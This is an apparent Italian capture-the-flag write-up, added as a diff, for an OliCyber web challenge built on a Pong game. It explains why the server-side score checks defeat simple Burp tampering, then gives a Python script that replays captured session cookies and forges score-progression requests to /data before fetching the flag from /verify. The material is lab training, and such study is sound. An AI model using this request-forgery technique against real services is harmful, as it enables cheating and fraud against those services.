@@ -1,0 +1,67 @@
+il sito convalida alla fine il punteggio quindi non posso modificare i dati con burp
+
+
+La sfida si basa su un meccanismo di validazione lato server (Server-Side Validation). Ecco perché il tuo primo tentativo con Burp non ha funzionato e perché la logica del gioco è un "tranello".
+
+1. Il server ha una "Memoria" (Stato)
+A differenza di sfide più semplici dove basta mandare punteggio=999, questo server tiene traccia della partita.
+
+Quando invii un punto a /data, il server aggiorna una variabile nella sua sessione (legata al tuo userID).
+
+Se provi a saltare da 0 a 5 punti in un colpo solo, il server nota l'anomalia (o semplicemente non aggiorna lo stato correttamente) e quando chiami /verify lui vede ancora che non hai raggiunto il WINNING_SCORE di 5.
+
+2. La separazione tra Gioco e Verifica
+Il codice JS mostra che ci sono due endpoint distinti:
+
+/data: È solo un "notificatore". Serve a dire al server "Ehi, ho segnato!". Il server risponde ok per dire "Ricevuto", ma non ti dà la flag qui.
+
+/verify: È il giudice. Quando lo chiami, il server controlla: "L'utente 131 ha effettivamente segnato 5 punti seguendo la cronologia corretta?". Se la risposta è sì, ti sputa la flag
+
+Il programmatore ha reso il gioco impossibile nel browser tramite queste righe:
+
+PADDLE_HEIGHT2 = PADDLE_HEIGHT2*2; 
+PADDLE_HEIGHT1 = PADDLE_HEIGHT1*0.5;
+Questo è un trucco lato client. La tua racchetta diventa piccola fisicamente nel tuo browser, ma al server non importa quanto è grande la tua racchetta; 
+al server importa solo ricevere i pacchetti HTTP che dicono che hai segnato. Lo script Python "vince" perché ignora completamente la grafica e parla direttamente al server.
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+import requests
+
+base_url = "http://rpo.challs.olicyber.it/"
+# Sostituisci con i TUOI cookie catturati da Burp
+cookies = {
+    'userID': '131',
+    'hashish': 'c707661313e54e179de15afa1a3a6cce908b21085e2549544c5cda5fe6266fa0'
+}
+
+def solve():
+    session = requests.Session()
+    session.cookies.update(cookies)
+    
+    # 1. Simuliamo i 5 punti necessari per vincere
+    # Il server si aspetta di vedere la progressione dei punti
+    for score in range(1, 6):
+        # Simuliamo un tempo che avanza (50 FPS nel JS, circa 500 unità a punto)
+        payload = {
+            'p1s': str(score),
+            'p2s': '0',
+            'time': str(score * 500) 
+        }
+        print(f"Inviando punto {score}...")
+        r = session.post(base_url + "data", data=payload)
+        print(f"Risposta /data: {r.text}")
+
+    # 2. Chiamiamo l'endpoint di verifica per ottenere la flag
+    print("\nRichiedo la flag a /verify...")
+    flag_response = session.get(base_url + "verify")
+    
+    print("-" * 30)
+    print("RISULTATO FINALE:")
+    print(flag_response.text)
+    print("-" * 30)
+
+if __name__ == "__main__":
+    solve()
+
+
+
+
